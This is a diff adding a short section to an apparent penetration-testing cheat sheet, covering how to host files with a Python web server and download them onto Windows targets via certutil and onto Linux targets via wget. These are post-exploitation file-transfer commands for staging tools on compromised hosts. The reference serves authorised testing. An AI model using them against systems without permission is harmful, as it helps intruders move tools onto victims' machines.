@@ -434,4 +434,24 @@ chmod +x linenum.sh
 ```
 - LinEnum (https://github.com/rebootuser/LinEnum)
 
+### Transferring Files To Windows and Linux Targets
+```
+python -m SimpleHTTPServer 80
+python3 -m http.server 80
+```
+- Setting Up A Web Server With Python
+
+```
+mkdir C:\Temp
+cd C:\Temp
+certutil -urlcache -f http://<ip>/<filename> <filename>
+```
+- Transferring Files to Windows Targets
+
+```
+cd /tmp
+wget http://<ip>/<filename>
+```
+- Transferring Files to Linux Targets
+
 ## Social Engineering
